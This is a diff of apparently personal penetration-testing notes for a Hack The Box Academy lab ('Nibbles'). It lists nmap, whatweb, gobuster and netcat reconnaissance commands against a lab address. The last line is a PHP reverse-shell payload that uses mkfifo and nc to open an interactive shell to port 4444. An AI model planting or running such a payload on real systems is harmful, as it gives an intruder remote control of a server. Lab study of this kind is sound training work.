@@ -83,6 +83,19 @@ netcat can be used to connect to any listening port and interact with the servic
 
 
 
+### Useful Links
+
+
+
+
+
+
+
+
+
+
+
+
 
   # install seclists = git clone https://github.com/danielmiessler/SecLists && sudo apt install seclists -y
   # Next, add a DNS Server such as 1.1.1.1 to the /etc/resolv.conf file.
@@ -94,16 +107,7 @@ netcat can be used to connect to any listening port and interact with the servic
   
 ##########################################################################################
 
-* File Inclusion / Directory Traversal (HTB Academy)
-* Linux Fundermentals (HTB Academy)
-* Login Attacks (HTB Academy)
-* Metasploit (HTB Academy)
-* Nmap (HTB Academy)
-* Web Enumeration
-* Windows Fundermentals (HTB Academy)
 
-
-  _______________________
   
 
 nmap -sV --open -oA nibbles_initial_scan <ip address>
@@ -170,7 +174,7 @@ nc -nv 10.129.42.249 80
 nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.249
 nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.249
 
-whatweb 10.129.42.249
-gobuster dir -u http://10.129.42.249/data/ --wordlist /usr/share/dirb/wordlists/common.txt
++whatweb 10.129.42.249
++gobuster dir -u http://10.129.42.249/data/ --wordlist /usr/share/dirb/wordlists/common.txt
 
 <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.129.42.249 4444 >/tmp/f"); ?>
